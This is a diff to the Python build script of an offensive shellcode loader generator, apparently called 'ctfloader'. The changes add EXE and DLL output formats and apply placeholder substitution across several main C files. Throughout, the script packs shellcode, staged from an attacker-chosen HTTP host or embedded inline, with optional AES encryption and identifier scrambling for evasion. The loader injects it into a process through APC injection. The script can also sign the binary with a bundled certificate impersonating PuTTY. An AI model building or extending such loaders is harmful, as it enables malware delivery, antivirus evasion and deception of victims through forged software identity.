@@ -31,6 +31,7 @@ def main():
 
     # Creating the arguments for the staged subcommand
     parser_staged.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
+    parser_staged.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
     parser_staged.add_argument("-i", "--ip-address", type=str, help="IP address from where your shellcode is gonna be fetched.", required=True)
     parser_staged.add_argument("-po", "--port", type=int, help="Port from where the HTTP connection is gonna fetch your shellcode.", required=True)
     parser_staged.add_argument("-pa", "--path", type=str, help="Path from where your shellcode uis gonna be fetched. ", required=True)
@@ -46,6 +47,7 @@ def main():
 
     # Creating the arguments for the stageless subcommand
     parser_stageless.add_argument("-p", "--payload", help="Shellcode to be packed", required=True)
+    parser_stageless.add_argument("-f", "--format", type=str, choices=["EXE", "DLL"], default="EXE", help="Format of the output file (default: EXE).")
     
     parser_stageless.add_argument("-e", "--encrypt", action="store_true", help="Encrypt the shellcode via AES-128-CBC.")
     parser_stageless.add_argument("-s", "--scramble", action="store_true", help="Scramble the loader's functions and variables.")
@@ -65,7 +67,7 @@ def main():
 #--------------------------------------#
 
     if args.commands == "staged":
-        
+
         print(Colors.green("[i] Staged Payload selected."))
         print(Colors.light_yellow("[+] Starting the process..."))
 
@@ -164,20 +166,19 @@ def main():
                 with open(f"{args.output}.bin", "wb") as file:
                     file.write(enc_payload)
 
-                # We write the key and IV into main.c 
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and (filename.endswith(".c")):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                # We look for the following placeholders: "#-KEY_VALUE-#" and "#-IV_VALUE-#" and replace them with the actual values
-                for i in range(len(main_data)):
-                    if "#-KEY_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
-                    if "#-IV_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
+                        for i in range(len(main_data)):
+                            if "#-KEY_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
+                            if "#-IV_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
 
-                # Writing the data back to the file
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
                 print(Colors.green(f"[+] Payload encrypted and saved to {os.getcwd()}\\{args.output}.bin !"))
 
@@ -188,34 +189,36 @@ def main():
                 print(Colors.green("[i] Encryption not selected."))
                 print(Colors.light_yellow("[+] Compiling the loader..."))
 
-                # We comment out the encryption function in the main.c file
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                # We comment out the encryption function in the main .c files
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and (filename.endswith(".c")):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                for i in range(len(main_data)):
-                    if "#include \"AES_128_CBC.h\"" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "AES_CTX" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "Starting the decryption..." in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
-                        main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"
+                        for i in range(len(main_data)):
+                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "AES_CTX" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "Starting the decryption..." in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
+                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"
 
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
                 # We copy the payload file to the path specified by the user
                 shutil.copy(args.payload, f"{args.output}.bin")
@@ -304,82 +307,101 @@ def main():
                         with open(f"{dst_directory}\\{filename}", "w") as file:
                             file.writelines(data)
 
-                # Modifying the main.c file
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                # Modifying the main files
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and filename.endswith(".c"):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                for i in range(len(main_data)):
-                    if "sEncPayload" in main_data[i]:
-                        main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
-                    if "pEncPayload" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
-                    if "pClearText" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
-                    if "ctx" in main_data[i]:
-                        main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
-                    if "hProcess" in main_data[i]:
-                        main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
-                    if "pProcess" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
-                    if "dwSizeOfClearText" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
-                    if "dwOldProtect" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
-                    if "dwProcessId" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
+                        for i in range(len(main_data)):
+                            if "sEncPayload" in main_data[i]:
+                                main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
+                            if "pEncPayload" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
+                            if "pClearText" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
+                            if "ctx" in main_data[i]:
+                                main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
+                            if "hProcess" in main_data[i]:
+                                main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
+                            if "pProcess" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
+                            if "dwSizeOfClearText" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
+                            if "dwOldProtect" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
+                            if "dwProcessId" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
 
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
                 print(Colors.green("[+] Loader scrambled !"))
 
-            if args.sign:
+            if args.format is None or args.format == "EXE":
+                if args.sign:
 
-                print(Colors.green("[i] Signing selected."))
-                print(Colors.light_yellow("[+] Signing the loader..."))
-                
-                osslsigncode_path = str(resources.files("custom_certs").joinpath("osslsigncode.exe"))
-                pfx_path = str(resources.files("custom_certs").joinpath("sign_putty.pfx"))
-                pfx_password = "Password"
-                input_binary = "ctfloader.exe"
-                signed_binary = "ctfloader_signed.exe"
+                    print(Colors.green("[i] Signing selected."))
+                    print(Colors.light_yellow("[+] Signing the loader..."))
+                    
+                    osslsigncode_path = str(resources.files("custom_certs").joinpath("osslsigncode.exe"))
+                    pfx_path = str(resources.files("custom_certs").joinpath("sign_putty.pfx"))
+                    pfx_password = "Password"
+                    input_binary = "ctfloader.exe"
+                    signed_binary = "ctfloader_signed.exe"
 
-                os.system(f"cd {dst_directory} && make clean && make")
-                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
+                    shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
 
-                if os.path.exists("ctfloader_signed.exe"):
-                    os.remove("ctfloader_signed.exe")
+                    if os.path.exists("ctfloader_signed.exe"):
+                        os.remove("ctfloader_signed.exe")
 
-                subprocess.run([
-                    osslsigncode_path,
-                    "sign",
-                    "-pkcs12", pfx_path,
-                    "-pass", pfx_password,
-                    "-n", "Signed Loader",
-                    "-i", "https://putty.com",
-                    "-t", "http://timestamp.sectigo.com",
-                    "-in", input_binary,
-                    "-out", signed_binary
-                ], check=True)
+                    subprocess.run([
+                        osslsigncode_path,
+                        "sign",
+                        "-pkcs12", pfx_path,
+                        "-pass", pfx_password,
+                        "-n", "Signed Loader",
+                        "-i", "https://putty.com",
+                        "-t", "http://timestamp.sectigo.com",
+                        "-in", input_binary,
+                        "-out", signed_binary
+                    ], check=True)
 
-                shutil.rmtree(dst_directory)
+                    shutil.rmtree(dst_directory)
 
-                print(Colors.green("[+] Loader signed !"))
+                    print(Colors.green("[+] Loader signed !"))
 
-            if args.sign is False:
-                
-                # Everything has been modified, we can now compile the loader
-                os.system(f"cd {dst_directory} && make clean && make")
+                if args.sign is False:
+                    
+                    # Everything has been modified, we can now compile the loader
+                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
+
+                    # We move the compiled loader one directory up
+                    shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+
+                    # We delete the temporary folder
+                    shutil.rmtree(dst_directory)
+
+                    print(Colors.green("[+] Loader compiled !"))
+
+                print(Colors.green("[+] DONE !"))
+
+            if args.format == "DLL":
+
+                print(Colors.green("[i] DLL format selected."))
+
+                os.system(f"cd {dst_directory} && make clean && make FORMAT=DLL")
 
                 # We move the compiled loader one directory up
-                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+                shutil.move(f"{dst_directory}\\ctfloader.dll", f"ctfloader.dll")
 
                 # We delete the temporary folder
                 shutil.rmtree(dst_directory)
 
                 print(Colors.green("[+] Loader compiled !"))
 
-            print(Colors.green("[+] DONE !"))
+                print(Colors.green("[+] DONE !"))
 
 #-----------------------------------------#
 #----------- Stageless Variant -----------#
@@ -465,22 +487,22 @@ def main():
                 # converting the payload to hex for ease
                 hex_payload = ', '.join(f"0x{b:02x}" for b in enc_payload)
 
-                # We write the key and IV into main.c 
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                # We write the key and IV into all files starting with "main"
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and (filename.endswith(".c")):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                # We look for the following placeholders: "#-KEY_VALUE-#" and "#-IV_VALUE-#" and replace them with the actual values
-                for i in range(len(main_data)):
-                    if "#-KEY_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
-                    if "#-IV_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
-                    if "#-PAYLOAD_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", str(hex_payload))
+                        for i in range(len(main_data)):
+                            if "#-KEY_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-KEY_VALUE-#", key)
+                            if "#-IV_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-IV_VALUE-#", iv)
+                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", str(hex_payload))
 
-                # Writing the data back to the file
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
                 print(Colors.green(f"[+] Payload encrypted and saved into payload[] variable in main.c !"))
 
@@ -490,36 +512,38 @@ def main():
                 print(Colors.green("[i] Encryption not selected."))
                 print(Colors.light_yellow("[+] Compiling the loader..."))
 
-                # We comment out the encryption function in the main.c file
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                # We comment out the encryption function in all main .c files
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and (filename.endswith(".c")):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                for i in range(len(main_data)):
-                    if "#include \"AES_128_CBC.h\"" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "AES_CTX" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
-                        main_data[i] = f"//{main_data[i]}"
-                    if "Starting the decryption..." in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "AES_DecryptBuffer(&ctx, &payload, pClearText, sEncPayload)" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
-                        main_data[i] = f"\t//{main_data[i]}"
-                    if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
-                        main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) &payload, sEncPayload, &pProcess)) {{"
-                    if "#-PAYLOAD_VALUE-#" in main_data[i]:
-                        main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", payload)
+                        for i in range(len(main_data)):
+                            if "#include \"AES_128_CBC.h\"" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "AES_CTX" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "uint8_t aes_k[16] = { #-KEY_VALUE-# };" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "uint8_t aes_i[16] = { #-IV_VALUE-# };" in main_data[i]:
+                                main_data[i] = f"//{main_data[i]}"
+                            if "Starting the decryption..." in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "pClearText = (PBYTE)malloc(sEncPayload);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "AES_DecryptInit(&ctx, aes_k, aes_i);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "AES_DecryptBuffer(&ctx, pEncPayload, pClearText, sEncPayload);" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "Payload decrypted at postion: 0x%p with size of %zu" in main_data[i]:
+                                main_data[i] = f"\t//{main_data[i]}"
+                            if "if (!APCInjection(hProcess, pClearText, sEncPayload, &pProcess))" in main_data[i]:
+                                main_data[i] = f"\tif (!APCInjection(hProcess, (PVOID) pEncPayload, sEncPayload, &pProcess)) {{"
+                            if "#-PAYLOAD_VALUE-#" in main_data[i]:
+                                main_data[i] = main_data[i].replace("#-PAYLOAD_VALUE-#", payload)
 
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
             if args.scramble:
 
@@ -604,83 +628,103 @@ def main():
                             file.writelines(data)
 
                 # Modifying the main.c file
-                with open(f"{dst_directory}\\main.c", "r") as file:
-                    main_data = file.readlines()
+                for filename in os.listdir(dst_directory):
+                    if filename.startswith("main") and filename.endswith(".c"):
+                        with open(f"{dst_directory}\\{filename}", "r") as file:
+                            main_data = file.readlines()
 
-                for i in range(len(main_data)):
-                    if "sEncPayload" in main_data[i]:
-                        main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
-                    if "pEncPayload" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
-                    if "pClearText" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
-                    if "ctx" in main_data[i]:
-                        main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
-                    if "hProcess" in main_data[i]:
-                        main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
-                    if "pProcess" in main_data[i]:
-                        main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
-                    if "dwSizeOfClearText" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
-                    if "dwOldProtect" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
-                    if "dwProcessId" in main_data[i]:
-                        main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
-                    if "payload" in main_data[i]:
-                        main_data[i] = main_data[i].replace("payload", scrambled_variables[9])
+                        for i in range(len(main_data)):
+                            if "sEncPayload" in main_data[i]:
+                                main_data[i] = main_data[i].replace("sEncPayload", scrambled_variables[0])
+                            if "pEncPayload" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pEncPayload", scrambled_variables[1])
+                            if "pClearText" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pClearText", scrambled_variables[2])
+                            if "ctx" in main_data[i]:
+                                main_data[i] = main_data[i].replace("ctx", scrambled_variables[3])
+                            if "hProcess" in main_data[i]:
+                                main_data[i] = main_data[i].replace("hProcess", scrambled_variables[4])
+                            if "pProcess" in main_data[i]:
+                                main_data[i] = main_data[i].replace("pProcess", scrambled_variables[5])
+                            if "dwSizeOfClearText" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwSizeOfClearText", scrambled_variables[6])
+                            if "dwOldProtect" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwOldProtect", scrambled_variables[7])
+                            if "dwProcessId" in main_data[i]:
+                                main_data[i] = main_data[i].replace("dwProcessId", scrambled_variables[8])  
+                            if "payload" in main_data[i]:
+                                main_data[i] = main_data[i].replace("payload", scrambled_variables[9])
 
-                with open(f"{dst_directory}\\main.c", "w") as file:
-                    file.writelines(main_data)
+                        with open(f"{dst_directory}\\{filename}", "w") as file:
+                            file.writelines(main_data)
 
                 print(Colors.green("[+] Loader scrambled !"))
 
-            if args.sign:
+            
+            if args.format is None or args.format == "EXE":
+                if args.sign:
 
-                print(Colors.green("[i] Signing selected."))
-                print(Colors.light_yellow("[+] Signing the loader..."))
-                
-                osslsigncode_path = str(resources.files("custom_certs").joinpath("osslsigncode.exe"))
-                pfx_path = str(resources.files("custom_certs").joinpath("sign_putty.pfx"))
-                pfx_password = "Password"
-                input_binary = "ctfloader.exe"
-                signed_binary = "ctfloader_signed.exe"
+                    print(Colors.green("[i] Signing selected."))
+                    print(Colors.light_yellow("[+] Signing the loader..."))
+                    
+                    osslsigncode_path = str(resources.files("custom_certs").joinpath("osslsigncode.exe"))
+                    pfx_path = str(resources.files("custom_certs").joinpath("sign_putty.pfx"))
+                    pfx_password = "Password"
+                    input_binary = "ctfloader.exe"
+                    signed_binary = "ctfloader_signed.exe"
 
-                os.system(f"cd {dst_directory} && make clean && make")
-                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
+                    shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
 
-                if os.path.exists("ctfloader_signed.exe"):
-                    os.remove("ctfloader_signed.exe")
+                    if os.path.exists("ctfloader_signed.exe"):
+                        os.remove("ctfloader_signed.exe")
 
-                subprocess.run([
-                    osslsigncode_path,
-                    "sign",
-                    "-pkcs12", pfx_path,
-                    "-pass", pfx_password,
-                    "-n", "Signed Loader",
-                    "-i", "https://putty.com",
-                    "-t", "http://timestamp.sectigo.com",
-                    "-in", input_binary,
-                    "-out", signed_binary
-                ], check=True)
+                    subprocess.run([
+                        osslsigncode_path,
+                        "sign",
+                        "-pkcs12", pfx_path,
+                        "-pass", pfx_password,
+                        "-n", "Signed Loader",
+                        "-i", "https://putty.com",
+                        "-t", "http://timestamp.sectigo.com",
+                        "-in", input_binary,
+                        "-out", signed_binary
+                    ], check=True)
 
-                shutil.rmtree(dst_directory)
+                    shutil.rmtree(dst_directory)
 
-                print(Colors.green("[+] Loader signed !"))
+                    print(Colors.green("[+] Loader signed !"))
 
-            if args.sign is False:
-                
-                # Everything has been modified, we can now compile the loader
-                os.system(f"cd {dst_directory} && make clean && make")
+                if args.sign is False:
+                    
+                    # Everything has been modified, we can now compile the loader
+                    os.system(f"cd {dst_directory} && make clean && make FORMAT=EXE")
+
+                    # We move the compiled loader one directory up
+                    shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+
+                    # We delete the temporary folder
+                    shutil.rmtree(dst_directory)
+
+                    print(Colors.green("[+] Loader compiled !"))
+
+                print(Colors.green("[+] DONE !"))
+
+            if args.format == "DLL":
+
+                print(Colors.green("[i] DLL format selected."))
+
+                os.system(f"cd {dst_directory} && make clean && make FORMAT=DLL")
 
                 # We move the compiled loader one directory up
-                shutil.move(f"{dst_directory}\\ctfloader.exe", f"ctfloader.exe")
+                shutil.move(f"{dst_directory}\\ctfloader.dll", f"ctfloader.dll")
 
                 # We delete the temporary folder
                 shutil.rmtree(dst_directory)
 
                 print(Colors.green("[+] Loader compiled !"))
 
-            print(Colors.green("[+] DONE !"))
+                print(Colors.green("[+] DONE !"))
 
 if __name__ == "__main__":
     main()
